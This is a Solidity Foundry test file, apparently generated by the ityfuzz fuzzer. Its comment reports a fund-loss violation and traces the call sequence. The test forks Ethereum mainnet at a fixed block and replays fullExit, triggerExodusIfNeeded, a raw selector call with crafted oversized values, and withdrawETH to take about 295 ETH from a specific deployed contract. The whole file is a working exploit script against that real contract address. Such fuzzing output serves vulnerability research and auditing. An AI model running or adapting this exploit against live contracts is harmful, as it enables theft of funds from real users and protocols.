// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad -c eth --onchain-block-number 20526072 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 295.147 ETH by interacting with the provided contracts

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] [38;2;128;151;173m0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad.[38;2;255;123;114mfullExit(0, [38;2;0;118;255m0x0000000000000000000000000000000000000000)
   ├─[1] [38;2;128;151;173m0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad.[38;2;255;123;114mtriggerExodusIfNeeded()
   ├─[1] [38;2;128;151;173m0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad.[38;2;255;123;114mcall([38;2;255;123;114mabi.encodeWithSelector(0xd6973fc6, 1048433, 0, 310011458777366244787.1316 ether, [1343334924429473375266368983337535570452732922788021001867.8445 ether, 0, 0, 0, 577593642209657267787867457306633472864715077298179807837.3578 ether, 451422523383178811222897716294127718021814434466134515896.3503 ether]))
   ├─[1] [38;2;128;151;173m0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad.[38;2;255;123;114mwithdrawETH(295.1479 ether)
   │  ├─[2] [38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   │  │  └─[3] [38;2;128;151;173m0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad.[38;2;255;123;114mfallback()


 */

contract C8ECa is Test {
    function setUp() public {
        vm.createSelectFork("eth", 20526072);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad).fullExit(0, 0x0000000000000000000000000000000000000000);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad).triggerExodusIfNeeded();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256[] memory arr0 = new uint256[](6);
        arr0[0] = 1343334924429473375266368983337535570452732922788021001867.8445 ether;
        arr0[1] = 0;
        arr0[2] = 0;
        arr0[3] = 0;
        arr0[4] = 577593642209657267787867457306633472864715077298179807837.3578 ether;
        arr0[5] = 451422523383178811222897716294127718021814434466134515896.3503 ether;
        I(0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad).d6973fc6(1048433, 0, 310011458777366244787.1316 ether, arr0);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x8ECa806Aecc86CE90Da803b080Ca4E3A9b8097ad).withdrawETH(295.1479 ether);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function withdrawETH(uint128) external payable;
    function d6973fc6(uint32,uint16,uint128,uint256[] memory) external payable;
    function triggerExodusIfNeeded() external payable;
    function fullExit(uint32,address) external payable;
}
